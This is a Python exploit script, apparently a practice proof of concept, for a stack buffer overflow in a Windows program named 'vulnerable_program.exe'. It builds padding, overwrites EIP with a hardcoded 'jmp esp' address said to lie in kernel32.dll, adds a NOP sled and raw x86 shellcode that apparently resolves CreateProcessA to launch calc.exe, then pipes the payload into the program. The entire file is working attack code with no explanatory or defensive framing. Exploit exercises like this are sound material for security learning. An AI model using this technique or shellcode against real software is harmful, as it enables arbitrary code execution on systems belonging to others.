from subprocess import Popen, PIPE

junk = b"A" * 72
eip_overload_addr = b"\xD7\xF2\x5F\x76" #(0061FEB0 -- location of dynamic ESP) (765FF2D7 -- location of jmp esp command in kernel32.dll helper module)
NOPS = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shell_code = (b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
			b"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
			b"\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01"
			b"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75"
			b"\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
			b"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
			b"\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53"
			b"\x53\x53\x53\x53\x52\x53\xff\xd7")

payload = junk + eip_overload_addr + NOPS + shell_code

p = Popen(["vulnerable_program.exe"], stdout=PIPE, stdin=PIPE)
p.communicate(payload)